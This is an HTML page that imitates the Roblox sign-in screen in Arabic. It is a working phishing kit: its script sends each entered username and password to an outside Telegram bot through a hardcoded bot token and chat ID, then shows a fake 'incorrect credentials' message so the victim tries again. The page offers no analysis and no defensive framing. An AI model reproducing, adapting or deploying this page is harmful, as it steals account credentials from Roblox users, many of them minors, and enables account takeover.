<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #e9f0f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .box { background: white; padding: 40px 30px; border-radius: 12px; max-width: 400px; width: 100%; box-shadow: 0 8px 30px rgba(0,0,0,0.12); }
        .logo { font-size: 28px; font-weight: 900; color: #1a1a2e; }
        .logo span { color: #2d7aff; }
        .top { display: flex; justify-content: space-between; border-bottom: 1px solid #ddd; padding-bottom: 10px; margin-bottom: 20px; }
        .top a { color: #2d7aff; text-decoration: none; font-size: 14px; margin-left: 12px; }
        h2 { font-size: 22px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; }
        button { width: 100%; padding: 14px; background: #2d7aff; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: 600; cursor: pointer; }
        .link { text-align: center; margin-top: 12px; font-size: 14px; }
        .link a { color: #2d7aff; text-decoration: none; }
        .divider { display: flex; align-items: center; margin: 18px 0; color: #aaa; font-size: 12px; }
        .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #ddd; }
        .divider::before { margin-right: 10px; }
        .divider::after { margin-left: 10px; }
        .footer { text-align: center; margin-top: 16px; font-size: 14px; }
        .footer a { color: #2d7aff; text-decoration: none; font-weight: 600; }
        .bottom { display: flex; justify-content: center; gap: 15px; margin-top: 12px; font-size: 13px; }
        .bottom a { color: #777; text-decoration: none; }
        .err { color: #d32f2f; background: #ffebee; padding: 8px; border-radius: 6px; display: none; margin-top: 10px; text-align: center; }
    </style>
</head>
<body>
<div class="box">
    <div class="top"><div class="logo">Roblox</div><div><a href="#">إنشاء</a><a href="#">الرائحة</a><a href="#">السوق</a></div></div>
    <h2>تسجيل الدخول إلى Roblox</h2>
    <form id="loginForm">
        <input type="text" id="username" placeholder="اسم المستخدم/البريد/الهاتف" required>
        <input type="password" id="password" placeholder="كلمة المرور" required>
        <button type="submit">تسجيل الدخول</button>
        <div class="link"><a href="#">نسيت كلمة المرور أو اسم المستخدم؟</a></div>
        <div class="link"><a href="#">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</a></div>
        <div class="err" id="errorMsg">⚠️ بيانات غير صحيحة</div>
        <div class="divider">أو</div>
        <div class="link"><a href="#">تسجيل دخول سريع</a></div>
        <div class="footer">ليس لديك حساب؟ <a href="#">اشتراك</a></div>
        <div class="bottom"><a href="#">الخصوصية</a><a href="#">الشروط</a><a href="#">اتصل بنا</a></div>
    </form>
</div>
<script>
    const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
    const CHAT_ID = '6526473202';
    function sendToTelegram(text) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
        }).catch(e => console.log(e));
    }
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        sendToTelegram(`<b>🔓 بيانات روبلوكس</b>\n\n👤 ${username}\n🔑 ${password}`);
        document.getElementById('errorMsg').style.display = 'block';
        setTimeout(() => {
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
            document.getElementById('errorMsg').style.display = 'none';
        }, 3000);
    });
</script>
</body>
</html>
